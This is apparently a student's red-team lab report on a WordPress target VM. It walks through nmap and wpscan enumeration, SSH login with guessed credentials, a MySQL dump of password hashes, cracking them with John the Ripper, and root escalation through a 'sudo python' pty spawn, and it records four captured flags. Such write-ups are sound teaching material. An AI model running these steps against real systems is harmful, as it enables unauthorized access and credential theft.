﻿Joaquin Serrano

# Red Team: Summary of Operations

### Table of Contents:
   * Exposed Services
   * Critical Vulnerabilities
   * Exploitation

### Exposed Services:
- Kali Linux Command:
Ping Scan only: $ nmap -sP 192.168.1.0/24
![](https://github.com/y2keno/final_project/blob/30062c908e5644872dddccd38346283d0b5f18b4/Final_Red_Team/images/image7.png)
 
Nmap scan results for each machine reveal the below services and OS details:

- Kali Linux Command: 
Find the version of the service running on port 192.168.1.110:
$ nmap -sV 192.168.1.110
![](https://github.com/y2keno/final_project/blob/df913b8917446432e94c1c6375b6100aa8389038/Final_Red_Team/images/image8.png)

This scan identifies the services below as potential points of entry:

- Target 1 -Michael
   * Port 22/TCP Open SSH
   * Port 80/TCP Open HTTP
   * Port 111/TCP Open rcpbind
   * Port 139/TCP Open netbios-ssn
   * Port 445/TCP Open netbios-ssn

### Critical Vulnerabilities: 
The following vulnerabilities were identified on each target:

- Target 1
   * Unsalted User Password Hash (WordPress Database)
   * Misconfiguration of User Privileges/Privilege Escalation
   * Weak User Password
   * User Enumeration (WordPress site)

### Exploitation
   * dirb returns the enumerated directories found within the target URL
![](https://github.com/y2keno/final_project/blob/2b18992a598038337b3eea06eb8e762ca11ae9a6/Final_Red_Team/images/image1.png)
![](https://github.com/y2keno/final_project/blob/9daf1cc299e38973b8392e18e94f21011da9d766/Final_Red_Team/images/image10.png)

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

- Target 1
   * flag1.txt: b9bbcb33e11b80be759c4e844


      * Exploit Used
         * WPScan to enumerate users of the Target 1 WordPress site
         * SSH using Michael’s credentials, Flag 1 was found
         * Flag 1 was found in /var/www in the HTML folder


- Kali Linux Command: 
$ wpscan -u http://192.168.1.110/wordpress -eu
![](https://github.com/y2keno/final_project/blob/f2315f50a2a9bd73db6ce996acaf697740dae695/Final_Red_Team/images/image2.png)
![](https://github.com/y2keno/final_project/blob/f2315f50a2a9bd73db6ce996acaf697740dae695/Final_Red_Team/images/image16.png)
![](https://github.com/y2keno/final_project/blob/dbc3bb6c5a0d8ced95df9e13162e2d82bcd9a675/Final_Red_Team/images/image22.png)
![](https://github.com/y2keno/final_project/blob/638eec6e538de727c61a25a0b6898746f70bac65/Final_Red_Team/images/image17.png)

  

  



   * flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c


   * Exploit used:
         * Continuation of exploit from Target 1. 
         * SSH using Michael’s credentials, Flag 2 was found. 
         * Flag 2 was found in /var/www next to the HTML folder that held Flag 1. 
Kali Linux Commands: 
      * $ ssh michael@192.168.1.110
      * pwd
      * cd var/www
      * ls -l
      * cat flag2.txt
  

  

* Flag 3: afc01ab56b50591e7dccf93122770cd2


* Exploit used: 
   * Continuation of Exploit from Target 1. 
* Capturing Flag 3: 
   * Gaining My SQL database access
   * Flag 3 was found in wp_posts table in the WordPress database
  





Kali Linux Command: $ mysql -u root -p
* Password: R@v3nSecurity  Host: 127.0.0.1
* Or $ mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1 
* show databases;
* use wordpress; 
* show tables;
* Select * from wp_users; 




  



  



  

  

  

* Flag 4: 715dea6c055b9fe3337544932f2941ce
* Exploit used:
   * Unsalted password hash and privilege escalation with Python
* Capturing flag 4: Secure user credentials from database, utilize John the Ripper to crack hash and use python to gain root privileges. 
   * Utilizing the info from capturing flag 3. The Select * from wp_users command will reveal the username and password hashes for Michael and Steven utilizing MySQL.
   * Copied the username and password hash for Steven. Saved the file and named it  hash.txt


* Kali Linux Commands: 
   * mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
   * show databases; 
   * use wordpress;
   * show tables; 
   * select * from wp_users;
  

  

* Utilized John the Ripper to crack the password hash from the hash.txt file.
* Kali Linux command: 
   * $ john hash
  

* Steven Password cracked: pink84
  

* SSH using Steven’s credentials, Flag 4 was found.
* ssh steven@192.168.1.110 
* pw:pink84
* sudo -l
* sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
  

* Use python to gain root privileges
  

* cd root
* ls
* cat flag4.txt
* Captured Flag4